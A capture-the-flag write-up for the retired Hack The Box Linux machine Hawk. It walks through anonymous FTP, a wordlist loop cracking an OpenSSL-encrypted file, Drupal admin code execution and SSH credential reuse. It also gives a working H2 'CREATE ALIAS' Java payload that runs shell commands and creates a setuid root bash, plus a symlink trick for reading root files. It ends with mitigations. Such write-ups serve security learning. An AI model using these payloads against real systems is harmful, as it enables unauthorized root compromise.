---
machine: Hawk
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, ftp, openssl, drupal, h2, symlink, privesc]
---

# Hawk — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Anonymous FTP delivers an OpenSSL-encrypted file; a wordlist attack recovers the password and gives Drupal admin. PHP execution in Drupal gives `www-data`, and credential reuse leads to `daniel`. H2 runs as root: a symlink to `root.txt` in the backup leaks the flag, and `CREATE ALIAS` runs Java for a root shell.

## Recon

```bash
nmap -Pn -sCV -p21,22,80,5435,8082,9092 <IP>
```

- `21` FTP with anonymous login, `22` SSH, `80` Drupal 7.58.
- `8082` is the H2 console; `5435` and `9092` are related ports.
- The site is Drupal and not vulnerable to Drupalgeddon2.

## Enumeration

Anonymous FTP has `.drupal.txt.enc`, OpenSSL-encrypted and base64-encoded. A `rockyou` loop tries passwords and finds the key; the plaintext reveals Drupal admin credentials.

```bash
while read p; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k "$p" >/dev/null 2>&1 && echo "$p" && break; done < rockyou.txt
```

## Foothold

With Drupal admin, edit a PHP template or upload a module to run code and get `www-data`.

## Lateral movement

The admin password is reused for `daniel` over SSH.

```bash
ssh daniel@hawk.htb
```

## Privilege escalation

H2 listens on localhost as root. Tunnel SSH to `8082` and use the console. In the H2 backup, place a `t.trace.db` symlink to `/root/root.txt` and download the ZIP with the flag. For a shell, log in to H2 and create a Java alias:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; } $$;
CALL SHELLEXEC('cp /bin/bash /tmp/root; chmod 6777 /tmp/root');
```

## Evidence

- Anonymous FTP and OpenSSL file.
- Brute force and Drupal admin.
- PHP RCE and `www-data`.
- Credential reuse and `daniel`.
- H2 as root, symlink and `CREATE ALIAS`.

## Lessons learned

- Weakly encrypted files fall to wordlists.
- Credential reuse connects web and system accounts.
- Exposed H2 running as root is RCE.
- Backups that follow symlinks leak arbitrary files.

## Mitigation and detection

- Disable anonymous FTP and use keys.
- Use unique passwords and secret management.
- Do not run H2 as root and restrict the console.
- Resolve symlinks and limit backups to allowed directories.

## References

- [0xdf — Hawk](https://0xdf.gitlab.io/2018/11/30/htb-hawk.html)
- [IppSec — Hawk](https://www.youtube.com/watch?v=UGd9JE1ZXUI)
- [Hack The Box — Hawk](https://app.hackthebox.com/machines/hawk)
